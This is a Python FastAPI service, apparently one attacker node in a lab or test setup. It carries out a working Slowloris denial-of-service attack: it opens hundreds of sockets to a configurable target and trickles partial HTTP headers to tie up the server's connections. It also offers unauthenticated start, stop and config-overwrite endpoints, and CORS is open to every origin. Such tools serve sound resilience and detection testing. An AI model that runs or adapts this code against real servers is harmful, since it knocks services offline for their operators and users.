"""
Attacker3 - Slowloris L7 Attacker

Maintains many half-open HTTP connections by periodically sending partial
headers. Exposes FastAPI control endpoints and Prometheus metrics.
"""

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from prometheus_client import Gauge, Counter
from node_monitor import Registry
from pathlib import Path
from pydantic import BaseModel
from typing import Dict, Any
import socket
import threading
import json
import time
import os
import random

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

MASTER_CONFIG_PATH = Path(__file__).resolve().parent.parent / "MASTER_CONFIG.json"


def load_master_config() -> Dict[str, Any]:
    if not MASTER_CONFIG_PATH.exists():
        raise RuntimeError("MASTER_CONFIG.json not found")
    with open(MASTER_CONFIG_PATH) as f:
        return json.load(f)


def write_master_config(config_json: str):
    if not MASTER_CONFIG_PATH.exists():
        raise RuntimeError("MASTER_CONFIG.json not found")
    with open(MASTER_CONFIG_PATH, "w") as f:
        f.write(config_json)
    return True


class CustomConfig(BaseModel):
    attack_type: str = "slowloris"
    socket_count: int = 300
    header_interval_ms: int = 10000
    keep_alive: bool = True
    target_host: str
    target_port: int
    headers: Dict[str, str] | None = None
    payload_bytes: int | None = 0
    connect_timeout_ms: int = 3000


# Metrics
ACTIVE_CONNECTIONS = Gauge(
    "slowloris_active_connections",
    "Number of open slowloris sockets",
)
HEADERS_SENT = Counter(
    "slowloris_headers_sent_total",
    "Total keep-alive header fragments sent",
)
BYTES_SENT = Counter(
    "slowloris_bytes_sent_total",
    "Total bytes sent by slowloris attacker",
)
CONNECT_ERRORS = Counter(
    "slowloris_connect_errors_total",
    "Failed connection attempts",
)
ATTACK_STATUS = Gauge(
    "slowloris_attack_status",
    "Attack status (0=idle,1=running,2=stopped)",
)


class SlowlorisAttack:
    def __init__(self):
        self.sockets: list[socket.socket] = []
        self.worker: threading.Thread | None = None
        self.stop_event = threading.Event()
        self.lock = threading.Lock()
        self.status = "idle"

    def _build_initial_payload(self, host: str) -> bytes:
        base_headers = [
            "GET / HTTP/1.1",
            f"Host: {host}",
            "User-Agent: attacker3-slowloris",
            "Accept-language: en-US",
        ]
        return ("\r\n".join(base_headers) + "\r\n").encode()

    def _send_keep_alive(self, sock: socket.socket):
        line = f"X-Keep-Alive: {random.randint(1, 999999)}\r\n".encode()
        sock.sendall(line)
        HEADERS_SENT.inc()
        BYTES_SENT.inc(len(line))

    def _send_payload_bytes(self, sock: socket.socket, size: int):
        if size and size > 0:
            payload = b"a" * size
            sock.sendall(payload)
            BYTES_SENT.inc(size)

    def _open_connections(self, config: Dict[str, Any]):
        target_host = config.get("target_host")
        target_port = int(config.get("target_port"))
        socket_count = int(config.get("socket_count", config.get("connections", 200)))
        connect_timeout_ms = int(config.get("connect_timeout_ms", 3000))
        initial_payload = self._build_initial_payload(target_host)

        for _ in range(socket_count):
            try:
                sock = socket.create_connection(
                    (target_host, target_port), timeout=connect_timeout_ms / 1000
                )
                sock.settimeout(connect_timeout_ms / 1000)
                sock.sendall(initial_payload)
                BYTES_SENT.inc(len(initial_payload))
                with self.lock:
                    self.sockets.append(sock)
            except Exception:
                CONNECT_ERRORS.inc()

        ACTIVE_CONNECTIONS.set(len(self.sockets))

    def _loop(self, config: Dict[str, Any]):
        interval = max(int(config.get("header_interval_ms", 10000)) / 1000, 1)
        payload_bytes = int(config.get("payload_bytes", 0) or 0)
        while not self.stop_event.is_set():
            with self.lock:
                sockets_snapshot = list(self.sockets)
            for sock in sockets_snapshot:
                try:
                    self._send_keep_alive(sock)
                    if payload_bytes > 0:
                        self._send_payload_bytes(sock, payload_bytes)
                except Exception:
                    with self.lock:
                        try:
                            sock.close()
                        except Exception:
                            pass
                        if sock in self.sockets:
                            self.sockets.remove(sock)
                        ACTIVE_CONNECTIONS.set(len(self.sockets))
            time.sleep(interval)

    def start(self, config: Dict[str, Any]):
        if self.status == "running":
            raise RuntimeError("Attack already running")

        self.stop_event.clear()
        self._open_connections(config)
        self.worker = threading.Thread(target=self._loop, args=[config], daemon=True)
        self.worker.start()
        self.status = "running"
        ATTACK_STATUS.set(1)

    def stop(self):
        if self.status != "running":
            return
        self.stop_event.set()
        if self.worker:
            self.worker.join(timeout=5)
        with self.lock:
            for sock in self.sockets:
                try:
                    sock.close()
                except Exception:
                    pass
            self.sockets.clear()
        ACTIVE_CONNECTIONS.set(0)
        self.status = "stopped"
        ATTACK_STATUS.set(2)

    def info(self) -> Dict[str, Any]:
        with self.lock:
            open_sockets = len(self.sockets)
        return {
            "status": self.status,
            "open_sockets": open_sockets,
        }


attack = SlowlorisAttack()

# Register monitoring
registry = Registry()
registry.registerFastAPIApp(app=app)


@app.get("/health")
async def health():
    return {"status": "ok", "type": "attacker3", "attack_status": attack.status}


@app.get("/config")
async def get_config():
    try:
        return load_master_config()
    except Exception as e:
        return JSONResponse(status_code=500, content={"error": str(e)})


@app.post("/config")
async def update_config(config: Dict[str, Any]):
    try:
        config_json = json.dumps(config, indent=2)
        write_master_config(config_json)
        return {"status": "ok", "message": "Config updated. Restart container to apply."}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/start")
async def start_attack():
    try:
        master = load_master_config()
        custom = master.get("custom_config", {})
        # Fallback to forward_host/port if not provided
        custom.setdefault("target_host", master.get("forward_host", "proxy"))
        custom.setdefault("target_port", master.get("forward_port", 8000))
        custom.setdefault("socket_count", custom.get("connections", 200))
        attack.start(custom)
        return {"status": "running", "open_sockets": attack.info()["open_sockets"]}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/stop")
async def stop_attack():
    try:
        attack.stop()
        return {"status": attack.status}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/status")
async def status():
    return attack.info()


@app.get("/")
async def root():
    return {
        "name": "attacker3-slowloris",
        "status": attack.status,
        "endpoints": {
            "health": "/health",
            "config": "/config",
            "start": "POST /start",
            "stop": "POST /stop",
            "status": "/status",
            "metrics": "/metrics",
        },
    }
